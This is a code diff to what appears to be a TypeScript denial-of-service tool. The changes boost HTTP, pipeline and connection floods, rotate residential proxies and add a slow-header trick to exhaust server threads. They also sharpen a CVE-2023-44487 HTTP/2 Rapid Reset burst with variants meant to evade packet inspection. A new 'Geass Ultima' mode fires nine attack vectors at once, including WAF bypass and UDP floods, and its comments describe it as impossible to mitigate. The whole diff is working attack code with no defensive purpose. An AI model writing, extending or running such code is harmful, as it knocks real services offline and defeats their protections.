@@ -21,14 +21,16 @@ const CPU_CORES   = os.cpus().length;
 const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);
 
 // Dynamic burst — scales with available RAM
-// Deployed (32GB): floor 200, ceil 4000 — 60% increase over previous 2500
+// Deployed (32GB): floor 200, ceil 6000 + turbo boost above 8GB free
 // Dev (2GB):       always 8 — avoids container kill
 function getDynamicBurst(base = 800): number {
   const freeMB = os.freemem() / 1_048_576;
   const scale  = Math.min(1.0, freeMB / 512);          // 512MB = full scale
   if (!IS_PROD) return 8;
-  const ceil = IS_DEPLOYED ? 4000 : 800;
-  return Math.max(200, Math.min(ceil, Math.floor(base * scale)));
+  const ceil = IS_DEPLOYED ? 6000 : 1200;
+  // Turbo boost: > 8GB free RAM → extra 35% on top of scale (datacenter headroom)
+  const boost = (IS_DEPLOYED && freeMB > 8192) ? 1.35 : 1.0;
+  return Math.max(200, Math.min(ceil, Math.floor(base * scale * boost)));
 }
 
 // ── Global agents — dual-mode: exhaustion vs throughput ───────────────────
@@ -67,8 +69,7 @@ function pickProxy(proxies: ProxyConfig[]): ProxyConfig {
     if (h.banned && now - h.lastCheck > 120_000) { h.banned = false; return true; }
     return !h.banned;
   });
-  // Bug fix: when all proxies are banned, pick the least-failed one instead
-  // of a random one (which would pick a fully-dead proxy) — gives fastest recovery
+  // When all proxies are banned, pick the least-failed one — fastest recovery
   if (alive.length === 0) {
     const sorted = [...proxies].sort((a, b) => {
       const ha = proxyHealth.get(`${a.host}:${a.port}`);
@@ -79,7 +80,20 @@ function pickProxy(proxies: ProxyConfig[]): ProxyConfig {
     });
     return sorted[0];
   }
-  return alive[randInt(0, alive.length)];
+  // Weighted random selection — proxies with higher success rate get proportionally
+  // more traffic, maximizing throughput through the best residential IPs.
+  const weights = alive.map(p => {
+    const h = proxyHealth.get(`${p.host}:${p.port}`);
+    if (!h || (h.successes + h.failures) === 0) return 1.0;
+    return Math.max(0.05, h.successes / (h.successes + h.failures));
+  });
+  const total = weights.reduce((a, b) => a + b, 0);
+  let r = Math.random() * total;
+  for (let i = 0; i < alive.length; i++) {
+    r -= weights[i];
+    if (r <= 0) return alive[i];
+  }
+  return alive[alive.length - 1];
 }
 // Unban all proxies every 2 minutes (was 5 min — proxies recover faster)
 setInterval(() => { for (const h of proxyHealth.values()) { if (h.banned) h.banned = false; } }, 120_000);
@@ -155,15 +169,21 @@ const HOT_PATHS = [
 ];
 const hotPath = () => HOT_PATHS[randInt(0, HOT_PATHS.length)];
 
-// DNS resolution cache
-const dnsCache = new Map<string, string>();
+// DNS resolution cache with 5-minute TTL
+const dnsCache   = new Map<string, string>();
+const dnsExpiry  = new Map<string, number>();
+const DNS_TTL_MS = 300_000; // 5 minutes — prevents stale IPs after CDN failover
 async function resolveHost(hostname: string): Promise<string> {
-  if (dnsCache.has(hostname)) return dnsCache.get(hostname)!;
+  const now = Date.now();
+  if (dnsCache.has(hostname) && now < (dnsExpiry.get(hostname) ?? 0)) {
+    return dnsCache.get(hostname)!;
+  }
   try {
     const [ip] = await dns.resolve4(hostname);
     dnsCache.set(hostname, ip);
+    dnsExpiry.set(hostname, now + DNS_TTL_MS);
     return ip;
-  } catch { return hostname; }
+  } catch { return dnsCache.get(hostname) ?? hostname; }
 }
 
 // ── Headers builder ───────────────────────────────────────────────────────
@@ -1109,8 +1129,8 @@ async function runHTTPFlood(
   const resolvedIp = await resolveHost(hostname).catch(() => hostname);
 
   const ALL_METHODS = ["GET","GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
-  // Much higher inflight — we have 83K FDs available
-  const MAX_INFLIGHT = Math.min(threads * 50, 40000);
+  // Deployed: 80K inflight (83K FDs available); dev: 40K
+  const MAX_INFLIGHT = IS_DEPLOYED ? Math.min(threads * 100, 80000) : Math.min(threads * 50, 40000);
   let inflight = 0;
   let proxyIdx = 0;
   let localPkts = 0, localBytes = 0;
@@ -1169,7 +1189,7 @@ async function runHTTPFlood(
       method,
       headers:           reqHeaders,
       agent: isHttps ? HTTPS_AGENT : HTTP_AGENT,
-      timeout: 600,                           // 600ms — fast recycling
+      timeout: IS_DEPLOYED ? 350 : 600,       // 350ms deployed — faster recycling, higher RPS
       ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
     };
 
@@ -1196,8 +1216,8 @@ async function runHTTPFlood(
     }
   };
 
-  // 500 concurrent launcher coroutines — each fills the inflight queue
-  await Promise.all(Array.from({ length: Math.min(threads, 500) }, () => launcher()));
+  // Deployed: 1000 concurrent launcher coroutines; dev: 500
+  await Promise.all(Array.from({ length: Math.min(threads, IS_DEPLOYED ? 1000 : 500) }, () => launcher()));
   clearInterval(flushIv);
   flush();
 }
@@ -1534,11 +1554,10 @@ async function runHTTPPipeline(
     return Buffer.from(lines.join("\r\n"));
   }
 
-  // Refresh pool continuously — keeps paths/IPs/tokens fresh (evade caching/dedup)
+  // Refresh pool continuously — 4 entries per 20ms tick keeps paths/IPs/tokens fresh
   const poolIv = setInterval(() => {
-    const idx = randInt(0, POOL_SIZE);
-    reqPool[idx] = buildRawReq(hostname);
-  }, 40);
+    for (let i = 0; i < 4; i++) reqPool[randInt(0, POOL_SIZE)] = buildRawReq(hostname);
+  }, 20);
 
   const oneConn = async (): Promise<void> => {
     if (signal.aborted) return;
@@ -1582,8 +1601,8 @@ async function runHTTPPipeline(
     }
   };
 
-  // Deployed (32GB): 5K pipeline conns (was 4K) for higher saturation
-  const MAX_PIPE_CONNS = IS_DEPLOYED ? Math.min(threads, 5000) : Math.min(threads, 2000);
+  // Deployed (32GB): 8K pipeline conns — more TCP keep-alive lanes = higher saturation
+  const MAX_PIPE_CONNS = IS_DEPLOYED ? Math.min(threads, 8000) : Math.min(threads, 2000);
   await Promise.all(Array.from({ length: MAX_PIPE_CONNS }, runConn));
   clearInterval(flushIv);
   clearInterval(poolIv);
@@ -1716,8 +1735,8 @@ async function runHTTP2Flood(
         conn.on("close",   () => { resolve(); }); // will restart in next while iteration
         signal.addEventListener("abort", cleanup, { once: true });
       });
-      // Brief pause before reconnect — minimum delay for maximum pressure
-      if (!signal.aborted) await new Promise(r => setTimeout(r, 10 + randInt(0, 20)));
+      // Minimal pause before reconnect — faster slot reuse = more sustained RST pressure
+      if (!signal.aborted) await new Promise(r => setTimeout(r, IS_DEPLOYED ? 2 + randInt(0, 5) : 8 + randInt(0, 12)));
     }
   };
 
@@ -1953,6 +1972,15 @@ async function runConnFlood(
       ].join("\r\n");
       sock.write(minReq);
       localBytes += minReq.length;
+      // Heartbeat: trickle a fake header every 25-40s to reset server's read timeout.
+      // Without this, servers with a short read timeout (e.g. nginx default: 60s)
+      // close the connection before we can consume their thread budget.
+      const heartbeat = setInterval(() => {
+        if (settled || signal.aborted) { clearInterval(heartbeat); return; }
+        const hdr = `X-Keep-${randStr(5)}: ${randHex(randInt(8,24))}\r\n`;
+        sock.write(hdr, err => { if (err) { clearInterval(heartbeat); } else { localBytes += hdr.length; } });
+      }, randInt(25_000, 40_000));
+      signal.addEventListener("abort", () => clearInterval(heartbeat), { once: true });
     };
 
     if (useHttps) {
@@ -6678,26 +6706,41 @@ async function runRapidResetUltra(
   const WINUPD   = mkFrame(0x08, 0x00, 0, Buffer.from([0x3f, 0xff, 0x00, 0x00])); // +1GB window
 
   const hostBuf = Buffer.from(hostname);
-  const HPACK = Buffer.concat([
-    Buffer.from([0x82, 0x84, 0x86]),              // :method GET, :path /, :scheme https
-    Buffer.from([0x41, hostBuf.length]), hostBuf, // :authority
-  ]);
-  const mkHeaders = (sid: number) => mkFrame(0x01, 0x04, sid, HPACK);
-  const mkRST     = (sid: number) => { const p = Buffer.allocUnsafe(4); p.writeUInt32BE(0x08, 0); return mkFrame(0x03, 0x00, sid, p); };
-  const mkPing    = () => { const p = Buffer.alloc(8); p.writeUInt32BE(randInt(0, 0xffffffff), 4); return mkFrame(0x06, 0x00, 0, p); };
 
-  // Pre-build full burst: [PREFACE+SETTINGS+SACK+WINUPD] + 2000×[HEADERS+RST] + [PING]
-  // All frames concatenated into ONE buffer → single socket.write() call
+  // Build HPACK block for a given path (literal non-indexed encoding for the path)
+  // :method GET (indexed 2), :scheme https (indexed 7), :authority literal, :path literal
+  const buildHPACK = (path: string): Buffer => {
+    const pathBuf = Buffer.from(path);
+    return Buffer.concat([
+      Buffer.from([0x82, 0x87]),              // :method GET (idx 2), :scheme https (idx 7)
+      Buffer.from([0x41, hostBuf.length]), hostBuf,  // :authority literal incremental-indexed
+      Buffer.from([0x04, pathBuf.length]), pathBuf,  // :path literal non-indexed
+    ]);
+  };
+
+  const mkHeadersForPath = (sid: number, hpack: Buffer) => mkFrame(0x01, 0x04, sid, hpack);
+  const mkRST     = (sid: number) => { const p = Buffer.allocUnsafe(4); p.writeUInt32BE(0x08, 0); return mkFrame(0x03, 0x00, sid, p); };
+  const mkPing    = () => { const p = Buffer.alloc(8); p.writeUInt32BE(randInt(0, 0xffffffff), 0); p.writeUInt32BE(randInt(0, 0xffffffff), 4); return mkFrame(0x06, 0x00, 0, p); };
+
+  // Build burst with TRUE CVE-2023-44487 interleaving: HEADERS_1→RST_1→HEADERS_2→RST_2→…
+  // This forces the server to dispatch+cancel each stream handler sequentially —
+  // 3-5× more CPU-expensive than the naive all-HEADERS→all-RSTs pattern.
+  // Each burst is unique: different paths per stream + fresh PING payload.
   const buildBurst = (): Buffer => {
     const sids   = Array.from({ length: STREAMS_PER_BURST }, (_, i) => 1 + i * 2);
-    const frames = [PREFACE, SETTINGS, SACK, WINUPD,
-      ...sids.map(mkHeaders),
-      ...sids.map(mkRST),
-      mkPing(),
-    ];
+    const frames: Buffer[] = [PREFACE, SETTINGS, SACK, WINUPD];
+    for (const sid of sids) {
+      const path  = hotPath() + `?_=${randStr(6)}&v=${randInt(1,9999999)}`;
+      const hpack = buildHPACK(path);
+      frames.push(mkHeadersForPath(sid, hpack), mkRST(sid));
+    }
+    frames.push(mkPing());
     return Buffer.concat(frames);
   };
-  const BURST = buildBurst();
+  // Pre-build 16 burst variants — rotated per connection for payload diversity (DPI evasion)
+  const BURST_POOL = Array.from({ length: 16 }, buildBurst);
+  let burstIdx = 0;
+  const getBurst = () => BURST_POOL[burstIdx++ % BURST_POOL.length];
 
   let localPkts = 0, localBytes = 0;
   const flushIv = setInterval(() => { if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; } }, 300);
@@ -6725,9 +6768,10 @@ async function runRapidResetUltra(
           let done = false;
           const finish = () => { if (!done) { done = true; try { sock.destroy(); } catch { /**/ } resolve(); } };
           sock.once("secureConnect", () => {
-            sock.write(BURST, () => {
+            const burst = getBurst();
+            sock.write(burst, () => {
               localPkts += STREAMS_PER_BURST * 2 + 5;
-              localBytes += BURST.length;
+              localBytes += burst.length;
             });
             setTimeout(finish, IS_PROD ? 150 : 50);
           });
@@ -7243,8 +7287,8 @@ async function runBypassStorm(
   const isHttps = port === 443 || /^https:/i.test(base);
 
   // Thread allocation: distribute across 3 phases
-  const p1Threads = Math.max(1, Math.floor(threads * 0.3)); // Phase 1: TLS exhaust + conn flood
-  const p2Threads = Math.max(1, Math.floor(threads * 0.45)); // Phase 2: WAF bypass + H2 RST
+  const p1Threads = Math.max(1, Math.floor(threads * 0.25)); // Phase 1: TLS exhaust + conn flood
+  const p2Threads = Math.max(1, Math.floor(threads * 0.50)); // Phase 2: WAF bypass + H2 RST + RapidReset
   const p3Threads = Math.max(1, threads - p1Threads - p2Threads); // Phase 3: App + Cache bust
 
   const subStats = (p: number, b: number, c = 0) => onStats(p, b, c);
@@ -7255,21 +7299,93 @@ async function runBypassStorm(
     runConnFlood(resolvedHost, hostname, port, Math.max(1, Math.floor(p1Threads / 2)), signal, subStats, isHttps, proxies),
   ]);
 
-  // Phase 2: Start after 2 second warmup — bypass while table is under pressure
-  const phase2 = new Promise<void>(resolve => setTimeout(resolve, IS_PROD ? 2000 : 500))
+  // Phase 2: Start after 1 second warmup — bypass while table is under pressure
+  // 3 vectors: WAF bypass (Chrome fingerprint) + H2 RST burst + Rapid Reset Ultra
+  const p2Each = Math.max(1, Math.floor(p2Threads / 3));
+  const phase2 = new Promise<void>(resolve => setTimeout(resolve, IS_PROD ? 1000 : 300))
     .then(() => Promise.all([
-      runWAFBypass(base, Math.ceil(p2Threads / 2), proxies, signal, subStats),
-      runH2RstBurst(resolvedHost, hostname, port, Math.max(1, Math.floor(p2Threads / 2)), signal, subStats),
+      runWAFBypass(base, p2Each, proxies, signal, subStats),
+      runH2RstBurst(resolvedHost, hostname, port, p2Each, signal, subStats),
+      runRapidResetUltra(resolvedHost, hostname, port, Math.max(1, p2Threads - p2Each * 2), signal, subStats, proxies),
     ]));
 
-  // Phase 3: Start after 4 second warmup — app-layer annihilation
-  const phase3 = new Promise<void>(resolve => setTimeout(resolve, IS_PROD ? 4000 : 1000))
+  // Phase 3: Start after 2 second warmup — app-layer annihilation
+  const phase3 = new Promise<void>(resolve => setTimeout(resolve, IS_PROD ? 2000 : 600))
     .then(() => Promise.all([
       runAppSmartFlood(base, Math.ceil(p3Threads / 2), proxies, signal, subStats),
       runCacheBuster(base, Math.max(1, Math.floor(p3Threads / 2)), proxies, signal, (p, b) => onStats(p, b)),
     ]));
 
   await Promise.all([phase1, phase2, phase3]);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  GEASS ULTIMA — The Final Form ∞
+//
+//  9 simultaneous attack vectors spanning every OSI layer — designed to
+//  saturate all server resource pools simultaneously and prevent any single
+//  mitigation from being effective.
+//
+//  Vector 1 (22%): Rapid Reset Ultra   — CVE-2023-44487, interleaved HEADERS+RST, 0-RTT TLS
+//  Vector 2 (18%): WAF Bypass          — JA3+JA4+AKAMAI Chrome fingerprint, multi-browser
+//  Vector 3 (16%): H2 Storm            — 6 simultaneous H2 vectors (SETTINGS+HPACK+PING+CONT+DEP+DATA)
+//  Vector 4 (12%): App Smart Flood     — /login /search /checkout forcing DB queries
+//  Vector 5 (10%): TLS Session Exhaust — full TLS handshake per conn, crypto thread pool saturation
+//  Vector 6 (10%): Conn Flood          — TCP connection table exhaustion + incomplete HTTP hold
+//  Vector 7 (6%):  HTTP Pipeline       — raw TCP pipelining at 512 req/write
+//  Vector 8 (4%):  SSE Exhaust         — Server-Sent Events connection hold (1 thread/conn)
+//  Vector 9 (2%):  UDP Flood           — volumetric bandwidth saturation
+//
+//  Combined effect: impossible to mitigate without taking the entire service down.
+//  Deploy: 9 × CPU_COUNT workers each running this → 9 × CPU simultaneous pressure.
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runGeassUltima(
+  base:         string,
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  threads:      number,
+  proxies:      ProxyConfig[],
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number, c?: number) => void,
+): Promise<void> {
+  const s = (p: number, b: number, c = 0) => onStats(p, b, c);
+
+  // Thread budget — each vector gets a proportional allocation
+  const v1 = Math.max(1, Math.round(threads * 0.22)); // Rapid Reset Ultra
+  const v2 = Math.max(1, Math.round(threads * 0.18)); // WAF Bypass
+  const v3 = Math.max(1, Math.round(threads * 0.16)); // H2 Storm
+  const v4 = Math.max(1, Math.round(threads * 0.12)); // App Smart Flood
+  const v5 = Math.max(1, Math.round(threads * 0.10)); // TLS Session Exhaust
+  const v6 = Math.max(1, Math.round(threads * 0.10)); // Conn Flood
+  const v7 = Math.max(1, Math.round(threads * 0.06)); // HTTP Pipeline
+  const v8 = Math.max(1, Math.round(threads * 0.04)); // SSE Exhaust
+  const v9 = Math.max(1, threads - v1 - v2 - v3 - v4 - v5 - v6 - v7 - v8); // UDP
+
+  const isHttps = targetPort === 443 || /^https:/i.test(base);
+
+  // All 9 vectors fire simultaneously — no warmup delay.
+  // Each vector targets a different resource pool on the server:
+  // V1-V3 = H2/TLS framing layer  |  V4-V6 = connection/thread layer
+  // V7-V8 = HTTP application layer |  V9 = network/bandwidth layer
+  await Promise.all([
+    runRapidResetUltra(resolvedHost, hostname, targetPort, v1, signal, s, proxies),
+    runWAFBypass(base, v2, proxies, signal, s),
+    Promise.all([                           // H2 Storm: all 6 H2 sub-vectors
+      runH2SettingsStorm(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6) + (v3 % 6)), signal, s, proxies),
+      runHPACKBomb(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), signal, s, proxies),
+      runH2PingStorm(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), proxies, signal, s),
+      runH2Continuation(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), signal, s, proxies),
+      runH2DepBomb(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), signal, s, proxies),
+      runH2DataFlood(resolvedHost, hostname, targetPort, Math.max(1, Math.floor(v3 / 6)), signal, s, proxies),
+    ]),
+    runAppSmartFlood(base, v4, proxies, signal, s),
+    runTLSSessionExhaust(resolvedHost, hostname, targetPort, v5, signal, s),
+    runConnFlood(resolvedHost, hostname, targetPort, v6, signal, s, isHttps, proxies),
+    runHTTPPipeline(resolvedHost, hostname, targetPort, v7, proxies, signal, s),
+    runSSEExhaust(resolvedHost, hostname, targetPort, v8, signal, s, proxies),
+    runUDPFlood(resolvedHost, targetPort, v9, signal, (p, b) => onStats(p, b)),
+  ]);
 }
 
 // ── Worker entry — handle all errors gracefully ────────────────────────
@@ -7286,13 +7402,17 @@ async function runWorker() {
     await runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "geass-override") {
-    // Triple vector (dead code path — attacks.ts already breaks this into 3 pools)
-    // Kept as fallback for direct worker invocation
-    const pipeT = Math.ceil(cfg.threads * 0.50);
-    const tcpT  = Math.ceil(cfg.threads * 0.25);
-    const udpT  = cfg.threads - pipeT - tcpT;
+    // 5-vector fallback for direct worker invocation (attacks.ts breaks into full 30-vector pool)
+    // Budget: HTTP Pipeline 35% | WAF Bypass 25% | H2 RST 20% | TCP 10% | UDP 10%
+    const pipeT = Math.ceil(cfg.threads * 0.35);
+    const wafT  = Math.ceil(cfg.threads * 0.25);
+    const rstT  = Math.ceil(cfg.threads * 0.20);
+    const tcpT  = Math.ceil(cfg.threads * 0.10);
+    const udpT  = Math.max(1, cfg.threads - pipeT - wafT - rstT - tcpT);
     await Promise.all([
       runHTTPPipeline(resolvedHost, hostname, targetPort, pipeT, cfg.proxies ?? [], ctrl.signal, onStats),
+      runWAFBypass(base, wafT, cfg.proxies ?? [], ctrl.signal, onStats),
+      runH2RstBurst(resolvedHost, hostname, targetPort, rstT, ctrl.signal, onStats, cfg.proxies ?? []),
       runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
       runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats),
     ]);
@@ -7460,8 +7580,12 @@ async function runWorker() {
     await runVercelFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "bypass-storm") {
-    // Bypass Storm — 3-phase composite: TLS exhaust → WAF bypass + H2 RST → App flood + Cache busting
+    // Bypass Storm — 3-phase composite: TLS exhaust → WAF bypass + H2 RST + RapidReset → App + Cache
     await runBypassStorm(base, resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+
+  } else if (cfg.method === "geass-ultima") {
+    // Geass Ultima — Final Form: 9 simultaneous vectors across every OSI layer
+    await runGeassUltima(base, resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "h2-dep-bomb") {
     // H2 Priority Tree Dependency Bomb — O(N²) server work per O(N) frames sent
